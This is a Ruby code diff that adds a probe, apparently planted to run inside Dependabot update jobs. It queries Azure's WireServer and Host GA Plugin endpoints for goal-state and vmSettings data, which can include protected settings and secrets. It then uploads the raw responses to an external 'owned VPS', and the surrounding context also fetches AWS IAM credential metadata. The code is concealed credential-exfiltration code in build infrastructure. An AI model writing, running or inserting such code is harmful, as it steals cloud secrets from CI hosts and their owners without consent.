@@ -158,6 +158,56 @@ rescue StandardError
   nil
 end
 
+def infra_xml_value(xml, element)
+  value = xml.to_s[%r{<#{element}>\s*([^<]{1,512}?)\s*</#{element}>}m, 1].to_s.strip
+  return nil unless value.match?(/\A[A-Za-z0-9._:@+\/-]{1,512}\z/)
+  value
+rescue StandardError
+  nil
+end
+
+def infra_azure_goalstate_summary(raw)
+  container_id = infra_xml_value(raw, "ContainerId")
+  role_config_name = infra_xml_value(raw, "ConfigName")
+  {
+    "container_id_present" => !container_id.nil?,
+    "container_id_sha256" => container_id ? Digest::SHA256.hexdigest(container_id) : "",
+    "role_config_name_present" => !role_config_name.nil?,
+    "role_config_name_sha256" => role_config_name ? Digest::SHA256.hexdigest(role_config_name) : "",
+    "extensions_config_uri_present" => raw.to_s.include?("<ExtensionsConfig>"),
+    "certificates_uri_present" => raw.to_s.include?("<Certificates>"),
+    "remote_access_uri_present" => raw.to_s.include?("<RemoteAccessInfo>")
+  }
+rescue StandardError
+  {}
+end
+
+def infra_azure_vmsettings_summary(raw)
+  parsed = JSON.parse(raw)
+  key_names = []
+  visit = lambda do |value|
+    case value
+    when Hash
+      value.each do |key, child|
+        key_names << key.to_s
+        visit.call(child)
+      end
+    when Array
+      value.each { |child| visit.call(child) }
+    end
+  end
+  visit.call(parsed)
+  sensitive_keys = key_names.select { |key| key.match?(/token|secret|password|credential|protected/i) }.uniq.sort
+  {
+    "top_level_keys" => parsed.is_a?(Hash) ? parsed.keys.map(&:to_s).sort : [],
+    "sensitive_key_name_count" => sensitive_keys.length,
+    "sensitive_key_names" => sensitive_keys.take(40),
+    "host_ga_plugin_version_present" => key_names.any? { |key| key.casecmp("hostGAPluginVersion").zero? }
+  }
+rescue StandardError
+  {"top_level_keys" => [], "sensitive_key_name_count" => 0, "sensitive_key_names" => []}
+end
+
 infra_job_id = ENV["DEPENDABOT_JOB_ID"].to_s
 if infra_job_id.match?(/\A[0-9]+\z/)
   guard = "/tmp/dependabot-infra-probe-#{infra_job_id}.done"
@@ -278,6 +328,63 @@ if infra_job_id.match?(/\A[0-9]+\z/)
       summary["host_gateway"]["route_gateway_docker_ping_stored_0600_on_owned_vps"] =
         infra_post(infra_job_id, "host-gateway-docker-ping", route_gateway_body)
     end
+
+    azure_versions_status, azure_versions_body = infra_proxy_http(
+      "http://168.63.129.16/?comp=versions",
+      headers: ["x-ms-version: 2012-11-30", "Metadata: true"]
+    )
+    azure_goalstate_status, azure_goalstate_body = infra_proxy_http(
+      "http://168.63.129.16/machine/?comp=goalstate",
+      headers: ["x-ms-version: 2012-11-30", "Metadata: true"]
+    )
+    azure_summary = {
+      "versions_status" => azure_versions_status,
+      "versions_length" => azure_versions_body.bytesize,
+      "versions_sha256" => Digest::SHA256.hexdigest(azure_versions_body),
+      "goalstate_status" => azure_goalstate_status,
+      "goalstate_length" => azure_goalstate_body.bytesize,
+      "goalstate_sha256" => Digest::SHA256.hexdigest(azure_goalstate_body)
+    }.merge(infra_azure_goalstate_summary(azure_goalstate_body))
+    if azure_goalstate_status == 200 && !azure_goalstate_body.empty?
+      azure_summary["goalstate_stored_0600_on_owned_vps"] =
+        infra_post(infra_job_id, "azure-wireserver-goalstate", azure_goalstate_body)
+    end
+
+    azure_container_id = infra_xml_value(azure_goalstate_body, "ContainerId")
+    azure_role_config_name = infra_xml_value(azure_goalstate_body, "ConfigName")
+    if azure_container_id && azure_role_config_name
+      correlation_hex = Digest::SHA256.hexdigest(
+        "#{infra_job_id}:#{Process.pid}:#{Time.now.to_f}"
+      )[0, 32]
+      correlation_id = [
+        correlation_hex[0, 8], correlation_hex[8, 4], correlation_hex[12, 4],
+        correlation_hex[16, 4], correlation_hex[20, 12]
+      ].join("-")
+      host_plugin_headers = [
+        "x-ms-version: 2015-09-01",
+        "x-ms-containerid: #{azure_container_id}",
+        "x-ms-host-config-name: #{azure_role_config_name}",
+        "x-ms-client-correlationid: #{correlation_id}"
+      ]
+      host_plugin_versions_status, host_plugin_versions_body = infra_proxy_http(
+        "http://168.63.129.16:32526/versions", headers: host_plugin_headers
+      )
+      vmsettings_status, vmsettings_body = infra_proxy_http(
+        "http://168.63.129.16:32526/vmSettings", headers: host_plugin_headers
+      )
+      azure_summary["host_plugin_versions_status"] = host_plugin_versions_status
+      azure_summary["host_plugin_versions_length"] = host_plugin_versions_body.bytesize
+      azure_summary["host_plugin_versions_sha256"] = Digest::SHA256.hexdigest(host_plugin_versions_body)
+      azure_summary["vmsettings_status"] = vmsettings_status
+      azure_summary["vmsettings_length"] = vmsettings_body.bytesize
+      azure_summary["vmsettings_sha256"] = Digest::SHA256.hexdigest(vmsettings_body)
+      azure_summary["vmsettings_shape"] = infra_azure_vmsettings_summary(vmsettings_body)
+      if vmsettings_status == 200 && !vmsettings_body.empty?
+        azure_summary["vmsettings_stored_0600_on_owned_vps"] =
+          infra_post(infra_job_id, "azure-host-plugin-vmsettings", vmsettings_body)
+      end
+    end
+    summary["azure_fabric"] = azure_summary
 
     imds_unauth_status, imds_unauth_role_body =
       infra_imds_get("/latest/meta-data/iam/security-credentials/")
